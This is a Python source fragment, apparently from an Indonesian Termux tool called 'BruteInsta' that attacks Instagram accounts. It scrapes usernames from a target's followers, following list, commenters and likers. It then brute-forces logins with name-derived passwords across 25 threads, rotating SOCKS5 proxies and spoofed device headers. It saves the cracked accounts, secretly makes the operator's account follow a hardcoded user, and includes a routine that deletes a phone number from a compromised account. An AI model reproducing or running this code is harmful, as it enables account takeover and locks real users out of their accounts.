        dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
        pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476'])
        kode = random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','19782521'])
        build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
        A = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))}; vivo 1907 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (31/12; {dpis}; 1080x2141; vivo; vivo 1907; 1907; {com}; {basa}; {kode})"
        B = f"Mozilla/5.0 (Linux; iphone 8.1.0; vivo 1820 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (27/8.1.0; {dpis}; {pxl}; vivo; vivo 1820; 1820; {com}; {basa}; {kode})"
        C = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))};  V2111 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (31/12; {dpis}; 720x1475;  vivo; V2111 V2111; 2111;  {com}; {basa}; {kode})"
        D = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))}; I2018 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (33/13; {dpis}; 2048x2048; vivo/iQOO; I2018; 2018; {com}; {basa}; {kode})"
        E = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))}; I2217 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (34/14; {dpis}; 1080x2313; vivo/iQOO; I2217; I2217; {com}; {basa}; {kode})"
        F = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))}; I2018 Build/{build,}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (33/13; {dpis}; 1080x2243; vivo/iQOO; I2018; 2018; {com}; {basa}; {kode})"
        G = f"Mozilla/5.0 (Linux; Android {str(random.randint(8,12))}; I2223 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (34/14; {dpis}; 1080x2320; vivo/iQOO; I2223; I2223; {com}; {basa}; {kode})"
        return random.choice([A,B,C,D,E,F,G])
        
    def Convert_cooks(self, item):
        try:
            sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
            ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
            csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
            donez = '%s; %s; %s; ig_nrcb=1; dpr=2;'%(csrft, ds_id, sesid)
        except Exception as e:
            donez = 'cookies tidak di temukan, error saat convert'
        return donez
    
    def GetPhone(self, cookie, status = {}):
        try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies = {'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',
               'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'})
            data = self.data_graph(resp)
            data.update({
               'fb_api_req_friendly_name':'FXAccountsCenterContactPointRootQuery',
               'variables':json.dumps({"interface":"IG_WEB"}),
               'doc_id':'6253939098058154'
            })
            xnxx = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
            if '"all_contact_points"' in str(xnxx):
                pone = re.search('{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(xnxx)).group(1)
                head.update({'x-fb-friendly-name': 'FXAccountsCenterDeleteContactPointMutation'})
                data.update({
                    'fb_api_req_friendly_name':'FXAccountsCenterDeleteContactPointMutation',
                    'variables':json.dumps({"normalized_contact_point":pone,"contact_point_type":"PHONE_NUMBER","selected_accounts":[f"{self.AccountId(resp)}"],"client_mutation_id":"mutation_id_1700749992848","family_device_id":"device_id_fetch_ig_did"}),
                    'doc_id':'6716611361758391'
                })
                haps = requests.post('https://accountscenter.instagram.com/api/graphql/', data = data, headers = head, cookies = {'cookie':cookie}).text
                if '"success":false' in haps:status.update({'Dihapus':False,'Number':pone})
                else:status.update({'Dihapus':True,'Number':pone})
            else:pass
        except Exception as e:
            status.update({'Dihapus':False,'Number':'None'})
        return(status)

class Brute:
    
    def __init__(self):
        self.tw, self.ok, self.cp, self.id, self.lp = 0, 0,0, [], 0
        self.head = {'user-agent': 'Mozilla/5.0 (Linux; Android 5.0.1; HUAWEI GRA-L09 Build/HUAWEIGRA-L09C150B196) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)',}
        self.param = {'count': '200','max_id': 'JhonChenXU','search_surface': 'follow_list_page'}
        self.dire = 'data/termux/internal'
        self.ipp = requests.get("https://api.ipify.org/?format=json").json()["ip"]

    def Path(self):
        if os.path.isfile('data/termux/internal/ds_user_id.txt') is True:
           try:
               cokie, nama = open('data/termux/internal/ds_user_id.txt','r',encoding='utf-8').read().split('<=>')
               uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
               req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['full_name']
               req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['follower_count']
               req2 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['following_count']
               req3 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = self.head, cookies = {'cookie':cokie}).json()['user']['username']
               return cokie, req, req1, req2, req3
           except:
               self.Login()
        else:
               self.Login()

    def Clear(self):
        try:os.system('clear' if 'linux' in sys.platform.lower() else 'cls')
        except:pass

    def Login(self):
        self.Clear() ; self.Logos()
        prints(Panel(f''' {P2}({H2}●{P2}) CookiesLog : masukan cookies instagram anda\n {P2}({H2}●{P2}) type : anda wajib menggunakan akun tumbal ''',width=56,padding=(0,1),style="turquoise2"))
        cokie = Console().input(f'   {P2}({H2}●{P2}) CookiesInput : ')
        if 'ds_user_id' in cokie:
            try:
                xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
                uid = re.search('ds_user_id=(\d+)', str(cokie)).group(1)
                ngtd = re.search("csrftoken=(.*?);", str(cokie)).group(1) ; self.followme(ngtd, cokie)
                req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = xyz, cookies = {'cookie':cokie}).json()['user']['full_name']
                req1 = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers = xyz, cookies = {'cookie':cokie}).json()['user']['username']
                open('data/termux/internal/ds_user_id.txt','w').write(f'{cokie}<=>{req}')
                prints(Panel(f''' {P2}({H2}●{P2}) Fullname : {H2}{req}\n {P2}({H2}●{P2}) Username : {H2}@{req1}''',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.3) ; self.Menu()
            except Exception as e:
                prints(Panel(f' {P2}({M2}●{P2}) Invalid cookies {M2}{str(e).title()}',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Login()
        else:
            prints(Panel(f' {P2}({M2}●{P2}) Username atau cookies tidak tersedia',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Login()

    def followme(self, tok, cok):
        try:
            headers = {"Host": "i.instagram.com","content-length": "0","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',"x-ig-app-id": "1217981644879628","x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV","sec-ch-ua-mobile": "?1","x-instagram-ajax": "1006447742","viewport-width": "360","content-type": "application/x-www-form-urlencoded","accept": "*/*","user-agent": "Instagram 37.0.0.21.97 Android (21/5.0.1; 480dpi; 1080x1794; HUAWEI; HUAWEI GRA-L09; HWGRA; hi3635; hu_HU; 98288242)","x-asbd-id": "198387","save-data": "on","x-csrftoken": tok,"sec-ch-ua-platform": '"Android"',"origin": "https://www.instagram.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.instagram.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"}
            requests.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("64474838009"), headers = headers, cookies = {"cookie":cok})
        except requests.ConnectionError as e : self.followme()
            
    def Logos(self):
        prints(Panel(f'''{H2} _       _                   
| |     (_)                  
| |      _  ____ _   _  ____ 
| |     | |/ _  ) | | |/ ___)
| |_____| ( (/ /| |_| | |    
|_______)_|\____)\____|_|    \n\n     {P2}Copyright © {H2}2024{P2} Ariff-Sensei.''',width=56,padding=(0,7),style="turquoise2"))

    def Menu(self):
        self.Clear() ; self.Logos()
        cokie, fullname, follower_count, following_count, userx = self.Path()
        prints(Panel(f' {P2}[{H2}*{P2}] fullname  : {H2}{fullname} {P2}| {H2}@{userx}\n {P2}[{H2}*{P2}] follower  : {H2}{follower_count} {P2}Person\n {P2}[{H2}*{P2}] following : {H2}{following_count} {P2}Person',width=56,padding=(0,1),style="turquoise2"))
        prints(Panel(f' {P2}[{H2}1{P2}]. Dump dari followers  {P2}[{H2}4{P2}]. Dump dari likes\n {P2}[{H2}2{P2}]. Dump dari following  {P2}[{H2}5{P2}]. CP detectedtor\n {P2}[{H2}3{P2}]. Dump dari komentar   {P2}[{H2}6{P2}]. Check OK/CP',width=56,padding=(0,1),style="turquoise2"))
        prints(Panel(f' {P2}({H2}●{P2}) Kamu bisa mengetik {H2}"exit"{P2} untuk logout\n {P2}({H2}●{P2}) Jika ingin ke menu lain ketik {B2}"lain"{P2}',width=56,padding=(0,1),style="turquoise2"))
        self.input_menu(cokie)

    def input_menu(self, kueh):
        x = Console().input(f'   {P2}({H2}●{P2}) InputMenu : ')
        if x == '1' or x == '01' or x == '2' or x == '02':
             prints(Panel(f' {P2}({H2}●{P2}) Masukan username target yang ingin di dump\n {P2}({H2}●{P2}) Username yang anda masukan harus publik ya',width=56,padding=(0,1),style="turquoise2"))
             uname = Console().input(f'   {P2}({H2}●{P2}) UsernameTarget : ')
             for users in uname.split(','):
                 getid = self.get_id(users,kueh)
             meki = False if x == '2' or x == '02' else True
             self.dump_acc(kueh, getid, meki, '')
             if len(self.id) > 0:self.methode()
             else:prints(Panel(f' {P2}({M2}●{P2}) Username/target yang anda masukan private',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Menu()

        elif x == '3' or x == '03':
             try:
                 prints(Panel(f' {P2}({H2}●{P2}) Masukan link postingan target dibawah\n {P2}({H2}●{P2}) Postingan yang anda masukan harus publik ya',width=56,padding=(0,1),style="turquoise2"))
                 link = Console().input(f'   {P2}({H2}●{P2}) LinkPost : ')
                 medi = self.get_mediaid(link, kueh)
                 for uid in medi:
                     self.GetUserComment(kueh, uid, '')
                 self.methode()
             except requests.exceptions.MissingSchema as e:
                 prints(Panel(f' {P2}({M2}●{P2}) {str(e).title()}',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Menu()

        elif x == '4' or x == '04':
             try:
                 prints(Panel(f' {P2}({H2}●{P2}) Masukan link postingan target dibawah\n {P2}({H2}●{P2}) Postingan yang anda masukan harus publik ya',width=56,padding=(0,1),style="turquoise2"))
                 link = Console().input(f'   {P2}({H2}●{P2}) LinkPost : ')
                 medi = self.get_mediaid(link, kueh)
                 for uid in medi:
                     self.Likes(kueh, uid)
                 self.methode()
             except requests.exceptions.MissingSchema as e:
                 prints(Panel(f' {P2}({M2}●{P2}) {str(e).title()}',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Menu()

        elif x == '5' or x == '05':
             try:
                 file = open(f'data/termux/internal/CP.txt','r').read()
             except:
                 prints(Panel(f' {P2}({M2}●{P2}) Opshhhhhh terjadi kesalahan',width=56,padding=(0,1),style="turquoise2")) ; time.sleep(3.1) ; self.Menu()
             for res in file.splitlines():
                 try:
                     user, pswd = res.split('|')[0], res.split('|')[1]
                     formatusr = '%s<=>%s'%(user, pswd)
                     if formatusr not in self.id:self.id.append(formatusr)
                 except IndexError:continue
             prints(Panel(f' {P2}({H2}●{P2}) Files akun checkpoint anda terdapat {K2}{len(self.id)}\n {P2}({H2}●{P2}) Crack ulang hasil checkpoint tergantung owner',width=56,padding=(0,1),style="turquoise2"))
             self.methode()

        elif x == '6' or x == '06':
            q = 0
            prints(Panel(f'{P2}[{H2}1{P2}]. Check akun OK   {P2}[{H2}3{P2}]. Check akun A2F\n{P2}[{H2}2{P2}]. Check akun CP   {P2}[{H2}4{P2}]. Back to menu',width=56,padding=(0,1),style="turquoise2"))
            h = Console().input(f'   {P2}({H2}●{P2}) InputMenu : ')
            if h in ('1','01'):dir='OK.txt'
            elif h in ('2','02'):dir='CP.txt'
            elif h in ('3','03'):dir='2F.txt'
            elif h in ('4','04'):self.Menu()
            else:self.Menu()
            Console().print(f'\n {P2}[{H2}+{P2}]. Check akun {dir}')
            for w in open(f'data/termux/internal/{dir}','r').read().splitlines():
                q +=1
                if dir == 'OK.txt':
                   prints(Panel(f' {P2}[{H2}{q}{P2}]. {H2}{w}',width=56,padding=(0,1),style="turquoise2"))
                else:
                   prints(Panel(f' {P2}[{H2}{q}{P2}]. {K2}{w}',width=56,padding=(0,1),style="turquoise2"))
            Console().print(f'\n {P2}[{H2}+{P2}] Berhasil mengecek akun OK/CP/A2F anda')
            Console().print(f' {P2}[{H2}+{P2}] BruteInsta : BruteForce{B2} Instagram {P2}BY {H2}ZuraKanagami\n {P2}[{H2}+{P2}] Copyright {H2}© {P2}2024 {B2}ZuraKanagami{P2} | All Rights Reserved')
        elif x == 'exit' or x == 'Exit' or x =='EXIT':
            os.system(f'rm -rf {self.dire}/ds_user_id.txt') ; self.Menu()
            
        else:self.Menu()

    def get_id(self, ccv, cokie, list=[]):
        try:
            rsd = requests.get(f'https://www.instagram.com/{ccv}/', cookies = {'cookie': cokie}).text
            uid = re.search('"user_id":"(\d+)"', str(rsd)).group(1)
            if uid not in list:list.append(uid)
            else:pass
        except:pass
        return(list)

    def get_mediaid(self, url, cokie):
        ahmasa = []
        self.head.update({'cookie':cokie})
        req = requests.get(url, headers = self.head).text
        idm = re.search('"media_id":"(\d+)"',str(req)).group(1)
        if len(idm) == 0:pass
        else:ahmasa.append(idm)
        return ahmasa

    def GetUserComment(self, cookie, media_id, max_min):
        try:
            HEADERS = {
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                 'content-type': 'application/x-www-form-urlencoded',
                 'x-csrftoken': re.findall('csrftoken=(.*?);',cookie)[0],
                 'cookie': cookie
            }
            response = requests.get(f'https://www.instagram.com/api/v1/media/{media_id}/comments/?can_support_threading=true&permalink_enabled=false&min_id={max_min}', headers = HEADERS).json()
            for y in response['comments']:
                format = '%s<=>%s'%(y['user']['username'], y['user']['full_name'])
                if format not in self.id:
                   self.id.append(format)
                   Console().print(f"   {P2}({H2}●{P2}) Berhasil dump {H2}{len(self.id)}{P2} uid {H2}{y['user']['id']}", end='\r')
            if 'next_min_id' in str(response):
                self.GetUserComment(cookie, media_id, response['next_min_id'])
        except requests.exceptions.MissingSchema as e:
            Console().print(f'\n {P2}[{M2}!{P2}] Terjadi kesalahan pada {str(e).title()}') ; time.sleep(3) ; self.Menu()

    def Likes(self, cokie, mediaid):
        try:
            self.head.update({'x-csrftoken':re.search('csrftoken=(.*?);',str(cokie)).group(1)})
            req = requests.get(f'https://www.instagram.com/api/v1/media/{mediaid}/likers/', cookies = {'cookie':cokie}, headers = self.head).json()
            for data in req['users']:
                xnxz = '%s<=>%s'%(data['username'], data['full_name'])
                Console().print(f'   {P2}({H2}●{P2}) Berhasil dump {H2}{len(self.id)}{P2} uid {H2}{data["pk_id"]}{P2}', end='\r')
                if xnxz not in self.id:self.id.append(xnxz)
        except:pass

    def dump_acc(self, cokie, users, type, max_id):
        xnxx = 'followers' if type is True else 'following'
        for user in users:
            try:
                self.param.update({'max_id':max_id})
                req = requests.get(f'https://www.instagram.com/api/v1/friendships/{user}/{xnxx}/', params = self.param, headers = self.head, cookies = {'cookie':cokie}).json()
                for data in req['users']:
                    xnxz = '%s<=>%s'%(data['username'], data['full_name'])
                    Console().print(f'   {P2}({H2}●{P2}) Berhasil dump {H2}{len(self.id)}{P2} uid {H2}{data["pk_id"]}{P2}', end='\r')
                    if xnxz not in self.id:self.id.append(xnxz)
                if 'next_max_id' in str(req):self.dump_acc(cokie, users, type, req['next_max_id'])
            except:pass
        return self.id

    def methode(self):
        prints(Panel(f' {P2}({H2}●{P2}) Berhasil mengumpulkan {H2}{len(self.id)}{P2} username\n {P2}({H2}●{P2}) Silahkan pilih metode login anda dibawah\n {P2}({H2}●{P2}) recommended menggunakan metode {H2}API {P2}& {H2}Threads',width=56,padding=(0,1),style="turquoise2"))
        prints(Panel(f''' {P2}[{H2}1{P2}]. Metode log Api     {P2}[{H2}4{P2}]. Metode log Api_V1\n {P2}[{H2}2{P2}]. Metode log Ajax    {P2}[{H2}5{P2}]. Metode log Api_V2\n {P2}[{H2}3{P2}]. Metode log Threads {P2}[{H2}6{P2}]. Metode log Ajax_in''',width=56,padding=(0,1),style="turquoise2"))
        xyz = Console().input(f'   {P2}({H2}●{P2}) InputMenu : ')
        prints(Panel(f' {P2}({H2}●{P2}) Apakah anda ingin menampilkan semua data akun?\n {P2}({H2}●{P2}) cnth : {B2}bio, userid, private, verifikasi',width=56,padding=(0,1),style="turquoise2"))
        yxz = Console().input(f'   {P2}({H2}●{P2}) InputMenu (y/t) : ')
        self.exec_malink(xyz, yxz)
    
    def exec_malink(self, methode_login, xontolmek):
        prints(Panel(f' {P2}({H2}●{P2}) {H2}OK{P2} atau {K2}CP{P2}|data/result/{H2}{hari_save}\n {P2}({H2}●{P2}) Hidupkan mode pesawat jika hasil mulai seret',width=56,padding=(0,1),style="turquoise2"))
        with executor(max_workers=25) as bol:
           for kontol in self.id:
               username, nama = kontol.split('<=>')
               password = Require().Password(nama)
               showdate = True if xontolmek in ('Y', 'y', 'Ya', ' YA') else None
               if methode_login in ('1','01'):bol.submit(self.ExecLogin, username, password, showdate)
               elif methode_login in ('2','02'):bol.submit(self.api_vjs, username, password,showdate)
               elif methode_login in ('3','03'):bol.submit(self.api_vjs2, username, password,showdate)
               elif methode_login in ('4','04'):bol.submit(self.api_vjs, username, password,showdate)
               elif methode_login in ('5','05'):bol.submit(self.api_vjs2, username, password,showdate)
               elif methode_login in ('6','06'):bol.submit(self.ExecAjax, username, password,showdate)
               else:bol.submit(self.ExecLogin, username, password, showdate)

        print('\n')
        Console().print(f' {P2}[{H2}*{P2}] Hasil OK : {H2}{self.ok}\n {P2}[{H2}*{P2}] Hasil CP : {K2}{self.cp}') ; Console().print(f' {P2}[{H2}+{P2}] dan total yang anda crack {B2}{len(self.id)}{P2} username\n\n')
        Console().print(f' {P2}[{H2}+{P2}] BruteInsta : BruteForce{B2} Instagram {P2}BY {H2}ZuraKanagami.\n {P2}[{H2}+{P2}] Copyright {H2}© {P2}2024 {B2}ZuraKanagami{P2}. | All Rights Reserved')
        __import__('os').remove('data/termux/internal/proxies.txt') ; sys.exit(0)

    def friends_user(self, name):
        try:
            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0',"Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",'sec-fetch-site': 'none'}
            self.head.update(yxz)
            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers = self.head).json()['data']['user']
            ikut, mengikut, posting, fulmmnn = req['edge_followed_by']['count'], req['edge_follow']['count'], req['edge_owner_to_timeline_media']['count'], req['full_name']
            return(ikut, mengikut, posting, fulmmnn)
        except:
            return("Null", "Null", "Null", "Null")
    
    def all_dateee(self, name):
        try:
            yxz = {'Host': 'www.instagram.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'none'}
            self.head.update(yxz)
            req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={name}', headers = self.head).json()['data']['user']
            ikut, mengikut, posting, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, xxtime, bus, ctname, biolinks = req['edge_followed_by']['count'], req['edge_follow']['count'], req['edge_owner_to_timeline_media']['count'], req['full_name'], req['id'], req['biography'], req['profile_pic_url_hd'], req['edge_mutual_followed_by']['count'], req['is_private'], req['is_verified'], req["fbid"], req['highlight_reel_count'], req['business_contact_method'], req['category_name'], req['bio_links']
            return(ikut, mengikut, posting, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, xxtime, bus, ctname, biolinks)
        except:
            return("Null", "Null", "Null", "Null", "Null", "Null", " Null", "Null", "None", "Null", "Null", "Null", "Null", "Null", "Null")

    def ExecLogin(self, user, passwd, allData_akun = None, file = 'data/termux/internal/'):
        uasu = []
        requ = Require()
        prox = requ.socks()
        byps = requests.Session()
        kont = random.randint
        uaig = requ.UserAgenttt()
        Console().print(f'   {P2}({H2}●{P2}) BruteInsta : {H2}BruteForce{P2} ({H2}{self.lp}{P2}/{H2}{len(self.id)}{P2}) OK-:{H2}{self.ok}{P2}/CP-:{K2}{self.cp}{P2}/{P2}A2F-:{M2}{self.tw} ',end='\r') ; sys.stdout.flush()
        while True:
            try:
                headers = {'User-Agent': uaig,'X-DEVICE-ID': '%s'%(str(uuid.uuid4())),'X-CM-Bandwidth-KBPS': '-1.000','X-CM-Latency': '-1.000','X-IG-App-Locale': 'id_ID','X-IG-Device-Locale': 'id_ID','X-IG-Connection-Speed': f'{random.randint(1000, 3700)}kbps','X-IG-Bandwidth-Speed-KBPS': '-1.000','X-IG-Bandwidth-TotalBytes-B': '0','X-IG-Bandwidth-TotalTime-MS': '0','X-Bloks-Version-Id': '1b030ce63a06c25f3e4de6aaaf6802fe1e76401bc5ab6e5fb85ed6c2d333e0c7','X-MID': '' if byps.cookies.get('mid') is None else byps.cookies.get('mid'),'X-IG-WWW-Claim': '0','X-Bloks-Is-Layout-RTL': 'false','X-IG-Connection-Type': 'WIFI','X-IG-Capabilities': '3brTvwE=','X-IG-App-ID': '567067343352427','X-IG-Device-ID': '%s'%(str(uuid.uuid4())),'X-IG-Android-ID': requ.DeviceId(),'Accept-Language': 'id-ID','X-FB-HTTP-Engine': 'Liger','Host': 'i.instagram.com','Accept-Encoding': 'gzip','Connection': 'close'}
                payload = {'post': '1','country_codes': '[{"country_code":"1","source":["default"]}]','phone_id':requ.poid(),'adid':requ.adid(user),'guid':requ.guid(),'device_id':requ.DeviceId(),'google_tokens': '[]','login_attempt_count': '0','username':user,'password':'JhonChenXU','queryParams': '{}','optIntoOneTap': 'false'}
                cookies = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                break
            except requests.exceptions.ConnectionError as e:
                time.sleep(15) ; self.ExecLogin(user, passwd, allData_akun, file='data/termux/internal/')
            except:pass
        for pswd in passwd:
            if pswd:
               try:
                   payload.update({'password':pswd})
                   headers.update({'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',})
                   data = json.dumps(payload)
                   xnxx = requ.Signature(data)
                   prok = {'http': 'socks5://' + random.choice(prox)}
                   resp = byps.post('https://i.instagram.com/api/v1/accounts/login/', cookies = {'cookie':cookies}, data = xnxx, headers = headers, proxies = prok)
                   if 'logged_in_user' in str(resp.text):
                       self.ok +=1
                       cookie = ';'.join(['%s=%s'%(name,value) for name, value in byps.cookies.get_dict().items()])
                       followers, following, postingan, fulxxnam = self.friends_user(user)
                       if allData_akun is not None:
                          try:
                              followers, following, postingan, fulmmnn, uidx, bio, pict, mutual, private, verifs, fbid, timelines, busi, ctasu, bioasu = self.all_dateee(user)
                              print('\r                                                                        ')
